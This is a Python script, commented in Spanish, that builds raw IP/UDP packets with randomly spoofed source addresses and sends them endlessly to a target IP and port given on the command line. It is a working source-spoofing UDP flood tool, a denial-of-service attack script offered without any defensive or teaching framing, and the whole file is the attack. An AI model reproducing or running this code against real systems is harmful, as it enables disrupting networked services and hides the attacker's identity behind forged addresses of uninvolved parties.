import socket
import struct
import random
import sys
import time

LEN = 512
MAX = 5000

def csum(buf):
    if len(buf) % 2 == 1:
        buf += b'\x00'  # Añadir un byte de padding si el buffer tiene longitud impar

    s = 0
    for i in range(0, len(buf), 2):
        w = buf[i] + (buf[i+1] << 8)
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def udp_checksum(ip_header, udp_header, data):
    pseudo_header = struct.pack('!4s4sBBH', ip_header[12:16], ip_header[16:20], 0, socket.IPPROTO_UDP, len(udp_header) + len(data))
    checksum = csum(pseudo_header + udp_header + data)
    return checksum

def main(argv):
    if len(argv) < 3:
        print(f"- Usage {argv[0]} <IP> <Port>")
        sys.exit(1)

    random.seed()
    DEST = argv[1]
    PDEST = int(argv[2])

    # Pedir al usuario que determine el tamaño del paquete en bytes
    packet_size = int(input("Introduce el tamaño del paquete en bytes: "))

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    
    packet = bytearray(LEN)
    
    ip_src = "0.0.0.0"
    ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 0, 0, 0, 64, socket.IPPROTO_UDP, 0, socket.inet_aton(ip_src), socket.inet_aton(DEST))
    udp_header = struct.pack('!HHHH', 0, PDEST, 0, 0)

    daddr = (DEST, PDEST)
    
    packet_count = 0
    while True:
        packet_count += 1
        ip_src = f"{60+random.randint(0,39)}.{random.randint(0,179)}.{random.randint(0,253)}.{random.randint(0,253)}"
        ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 0, random.randint(10000, 35000), 0, random.randint(50, 149), socket.IPPROTO_UDP, 0, socket.inet_aton(ip_src), socket.inet_aton(DEST))
        
        # Establecer los datos de acuerdo al tamaño del paquete
        data = b'\xff' * (packet_size - (len(ip_header) + len(udp_header)))
        
        udp_len = len(udp_header) + len(data)
        ip_len = len(ip_header) + udp_len

        ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, ip_len, random.randint(10000, 35000), 0, random.randint(50, 149), socket.IPPROTO_UDP, 0, socket.inet_aton(ip_src), socket.inet_aton(DEST))
        udp_header = struct.pack('!HHHH', 27005, PDEST, udp_len, 0)
        
        checksum = udp_checksum(ip_header, udp_header, data)
        udp_header = struct.pack('!HHHH', 27005, PDEST, udp_len, checksum)
        
        packet = ip_header + udp_header + data
        s.sendto(packet, daddr)

        # Mostrar el progreso
        print(f"Paquete {packet_count} enviado desde {ip_src} a {DEST}:{PDEST} con tamaño {packet_size} bytes")

        # Esperar un segundo para no inundar la consola con mensajes (opcional)
        time.sleep(1)

if __name__ == "__main__":
    main(sys.argv)
